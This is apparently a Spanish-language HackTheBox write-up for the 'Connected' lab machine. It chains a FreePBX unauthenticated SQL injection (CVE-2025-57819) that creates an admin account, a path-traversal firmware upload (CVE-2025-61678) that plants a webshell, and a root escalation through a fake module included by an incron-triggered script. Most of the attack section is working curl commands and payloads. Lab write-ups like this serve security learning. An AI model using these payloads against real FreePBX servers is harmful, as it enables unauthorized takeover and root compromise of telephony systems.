---
title: "HTB Connected — Writeup"
date: 2026-06-13 00:00:00 +0200
categories: [Writeups, HackTheBox]
tags: [freepbx, sqli, file-upload, rce, incron, php, cve-2025-57819, cve-2025-61678, linux, easy]
image:
  path: /assets/img/posts/htb-connected-banner.png
  alt: HTB Connected
---

**Dificultad:** Fácil  
**OS:** Linux (CentOS 7)  
**Objetivo:** Comprometer un servidor FreePBX mediante SQLi no autenticada y file upload con path traversal, escalar a root abusando de un hook PHP ejecutado por incron.

---

## Resumen

Connected expone un panel FreePBX 16.0.40.7 en HTTPS. La cadena completa pasa por tres fases: crear un usuario administrador mediante SQLi no autenticada (CVE-2025-57819), subir una webshell con path traversal en el upload de firmware (CVE-2025-61678) con un truco para sortear una condición de race del chunk file, y escalar a root abusando de un script PHP ejecutado como root por incron que hace `include` desde un directorio controlable por el usuario `asterisk`.

---

## Reconocimiento

```bash
nmap -sCV -p- --min-rate 5000 -oN results/connected/scans/full.nmap <IP>
```

Puertos relevantes:
- **443/tcp** — HTTPS: FreePBX 16.0.40.7 (Apache 2.4.6, PHP 7.4.16, CentOS 7)

El panel de login en `/admin/` muestra un `<div id="key" style="color:white">` con el PHPSESSID actual como texto oculto — ese valor coincide con la contraseña de admin en ese instante, aunque la sesión rota constantemente y resulta poco práctica para loguear directamente.

---

## SQLi no autenticada → usuario admin (CVE-2025-57819)

El módulo `endpoint` expone un endpoint AJAX vulnerable a stacked queries sin autenticación:

```
GET /admin/ajax.php?module=FreePBX\modules\endpoint\ajax&command=model&template=x&model=model&brand=PAYLOAD
```

La respuesta devuelve siempre un error de Redis — es normal, FreePBX tiene Redis mal configurado. Las queries stacked se ejecutan igualmente contra MySQL.

Creamos un usuario administrador:

```bash
HASH=$(python3 -c "import hashlib; print(hashlib.sha1(b'hax123').hexdigest())")

curl -sk "https://<IP>/admin/ajax.php?module=FreePBX\modules\endpoint\ajax&command=model&template=x&model=model&brand=x';+INSERT+INTO+ampusers+(username,password_sha1,sections)+VALUES+('hax','$HASH','*')+ON+DUPLICATE+KEY+UPDATE+password_sha1='$HASH';+--+-"
```

Login two-step (FreePBX requiere la cookie de sesión del GET inicial):

```bash
SESS=$(curl -sk -c /tmp/cook.txt https://<IP>/admin/ | grep -oP '(?<=id="key" style="color:white">)[^<]+')
curl -sk -b /tmp/cook.txt -c /tmp/cook.txt -X POST https://<IP>/admin/index.php \
  -d "username=hax&password=hax123&chklogin=1"
```

---

## File upload con path traversal → webshell como `asterisk` (CVE-2025-61678)

El endpoint autenticado `upload_cust_fw` del módulo endpoint acepta un parámetro `fwbrand` sin sanitizar, permitiendo path traversal para crear directorios y escribir archivos fuera de la ruta prevista.

### El problema del chunk file

El upload falla con `unlink(shell.php0): No such file` antes de escribir el chunk. PHP intenta hacer unlink del chunk temporal que todavía no existe — la ejecución se corta antes de llegar al `rename` que escribiría la webshell.

**Solución en dos pasos:**

**1.** Primer upload — falla, pero crea el directorio `/var/www/html/fw99/` via `mkdir()`:

```bash
curl -sk -b /tmp/cook.txt \
  -H "Referer: https://<IP>/admin/config.php" \
  -F "fwbrand=../../../var/www/html/fw99" \
  -F "fwmodel=x" \
  -F "fwversion=1.0" \
  -F "dzchunkindex=0" \
  -F "dztotalchunkcount=1" \
  -F "dztotalfilesize=27" \
  -F "dzchunkbyteoffset=0" \
  -F "dzuuid=aaaa" \
  -F "file=@shell.php;type=application/octet-stream" \
  "https://<IP>/admin/ajax.php?module=endpoint&command=upload_cust_fw"
```

**2.** Usar la SQLi para pre-crear el chunk file en el directorio recién creado (writable por el usuario `mysql`):

```bash
curl -sk "https://<IP>/admin/ajax.php?module=FreePBX\modules\endpoint\ajax&command=model&template=x&model=model&brand=x';+SELECT+'x'+INTO+OUTFILE+'/var/www/html/fw99/shell.php0';+--+-"
```

**3.** Segundo upload — ahora `shell.php0` existe, `unlink` OK, la webshell llega a disco:

```bash
# mismo curl anterior — repite exactamente igual
```

Verificar:

```bash
curl -sk "https://<IP>/fw99/shell.php?c=id"
# uid=993(asterisk) gid=990(asterisk)
```

---

## User flag

```bash
curl -sk "https://<IP>/fw99/shell.php?c=cat+/home/asterisk/user.txt"
```

---

## Privesc → root via incron + sysadmin_ha

### Análisis

Enumerando el sistema desde la webshell:

```bash
curl -sk "https://<IP>/fw99/shell.php?c=cat+/etc/incron.d/legacy"
# /usr/local/asterisk/ha_trigger IN_CLOSE_WRITE /usr/sbin/sysadmin_ha

curl -sk "https://<IP>/fw99/shell.php?c=ls+-la+/usr/local/asterisk/ha_trigger"
# -rwxrwxrwx 1 root root ... ha_trigger   ← world-writable
```

El script `/usr/sbin/sysadmin_ha` corre como root e incluye PHP desde un módulo:

```php
if(file_exists("/var/www/html/admin/modules/freepbx_ha/license.php")) {
    include_once("/var/www/html/admin/modules/freepbx_ha/license.php");
    $i = "/var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php";
    if (file_exists($i)) {
        require_once($i);
        $incron = new incron;
        $incron->rootTrigger();
    }
}
```

El directorio `/var/www/html/admin/modules/` es writable por `asterisk` — podemos crear el módulo entero.

### Exploit

```bash
# Crear estructura del módulo
curl -sk "https://<IP>/fw99/shell.php?c=mkdir+-p+/var/www/html/admin/modules/freepbx_ha/functions.inc"

# license.php — placeholder válido para pasar el file_exists
curl -sk "https://<IP>/fw99/shell.php?c=echo+'<?php+//+?>'+>+/var/www/html/admin/modules/freepbx_ha/license.php"

# incron.php — payload ejecutado como root
curl -sk "https://<IP>/fw99/shell.php" \
  --data-urlencode 'c=cat > /var/www/html/admin/modules/freepbx_ha/functions.inc/incron.php << '"'"'EOF'"'"'
<?php
class incron {
    public function rootTrigger() {
        system("cat /root/root.txt > /var/www/html/fw99/root.txt");
        system("chmod 644 /var/www/html/fw99/root.txt");
    }
}
EOF'

# Disparar incron escribiendo en el fichero vigilado
curl -sk "https://<IP>/fw99/shell.php?c=echo+trigger+>+/usr/local/asterisk/ha_trigger"

# Leer el flag
sleep 1
curl -sk "https://<IP>/fw99/root.txt"
```

---

## Por qué funciona

| Pieza | Por qué es explotable |
|-------|----------------------|
| CVE-2025-57819 | Redis mal configurado causa errores en el UI pero las stacked queries MySQL se ejecutan igualmente |
| CVE-2025-61678 | `fwbrand` no sanitizado → path traversal + `mkdir()` crea el directorio de destino |
| Chunk file trick | El directorio creado por PHP es writable por `mysql` → `INTO OUTFILE` puede seedear el chunk |
| sysadmin_ha | No verifica que el módulo `freepbx_ha` sea legítimo antes de hacer `include` |
| ha_trigger | World-writable + incron corre `sysadmin_ha` como root en cada `IN_CLOSE_WRITE` |

---

## Referencias

- [CVE-2025-57819](https://www.cvedetails.com/cve/CVE-2025-57819/) — FreePBX unauthenticated SQL injection
- [CVE-2025-61678](https://www.cvedetails.com/cve/CVE-2025-61678/) — FreePBX authenticated file upload with path traversal
- [FreePBX 16.0.40.7](https://www.freepbx.org/)
- [incron](https://github.com/ar-/incron) — inotify cron daemon
